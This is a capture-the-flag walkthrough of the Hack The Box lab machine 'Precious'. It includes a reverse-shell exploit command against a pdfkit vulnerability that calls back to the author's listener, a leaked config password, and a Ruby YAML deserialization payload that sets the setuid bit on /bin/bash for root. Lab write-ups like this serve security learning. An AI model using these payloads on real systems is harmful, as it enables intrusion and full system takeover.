# Box: Precious
# Level: Easy
# OS: Linux
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A -v -p- -T4 10.129.228.98```

```
Nmap scan report for 10.129.228.98
Host is up, received syn-ack (0.20s latency).
Scanned at 2023-11-02 16:14:00 WAT for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.80 seconds
```
From our scan we have 2 open ports, port 22 which runs the ssh service and port 80 which runs the http service. We will focus our enumeration today on port 80.



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6968606e-28ec-4f6f-974b-a24c4fa3f55c)

Add this domain name to your ```/etc/hosts``` file

Now lets navigate to the webpage again

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f1570fb6-22f6-4f42-942e-2fdc57ffeb73)

This web application helps us converts webpage to pdf. 

Lets create a file, then we'll host it using a python server, we'll try to convert the file to a pdf

command:```echo "hello" > hello.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d451f589-6ef9-4a82-a47a-bab25edf0685)

Now, lets convert the ```hello.txt``` file to a pdf

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1d45d647-7db0-4935-a626-7cf5d0fca666)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2c3b67d5-72b4-4edd-a7d6-be23402965bc)

Download this file to your machine and analyze it with ```exiftool```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2f20140d-70ae-4114-8def-0adacab2e2e9)

We can see that the document is being generated with ```pdfkit```. Doing my research I found out that there's an exploit for this version of ```pdfkit```. Lets exploit this.



# Exploitation

I found this [exploit](https://github.com/UNICORDev/exploit-CVE-2022-25765/blob/main/exploit-CVE-2022-25765.py)

To run it

command:```python exploit.py```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9b271ba3-458f-4828-89f0-56cc8b8b2a56)

since we have the usage, lets spawn a reverse shell

command:```python exploit.py -s 10.10.14.153 1234 -w http://precious.htb -p url```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/98792d33-c8df-4640-a667-2e6dc435155f)

Lets stabilize this shell

```
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl + z (To background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73f0c1c3-aa9f-4578-a7c9-db8eaf8090a7)

Lets go ahead and escalate our privileges



# Privilege Escalation

In the user home directory, there's a  directory used by Bundler to store configuration files

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9694c78e-8a0c-4b6f-bf6c-46ac996720f6)

nice nice, we found the password for user ```henry``` in the configuration file

Lets ssh into the server with this

username:```henry```        password"```Q3c1AqGHtoI0aXAYFH```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8d0b1a31-f3aa-4614-bd25-7eec3e8e23e1)

We are in, lets further escalate our privileges

Running the ```sudo -l``` command

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f81e0c94-ae08-4196-98f5-a8ae59713f1d)

We can see that this user can run the command ```/usr/bin/ruby /opt/update_dependencies.rb``` without providing a password

Lets view the script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8693fb0-046c-4ca0-8dd0-74fffe65eb71)

The file ```dependencies.yml``` allows for user-controlled input to the ```update_dependencies.rb``` script. This is vulnerable to deserialization attack

Using this [blog](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml) we'll create our ```dependencies.yml``` file

```yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/80ee32c7-651e-4b2a-90f2-5900cf4dc386)

Now lets run the command below

command:```sudo /usr/bin/ruby /opt/update_dependencies.rb```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c0360c8c-8508-4ef2-808e-96fcbd44e4c1)

nice nice, it executed our script

Lets spawn a reverse shell with this

```yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```
Save this new script, then we'll try to run it

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/54db4619-33f5-42bf-b064-50afadd8e3ec)

What the script did was to set the "setuid" bit on the ```/bin/bash``` executable file. 

To spawn a shell as the root user, we can use the command ```/bin/bash -p```


We have successfully pwned this box


That will be all for today
<br><br>
[Back To Home](../../index.md)























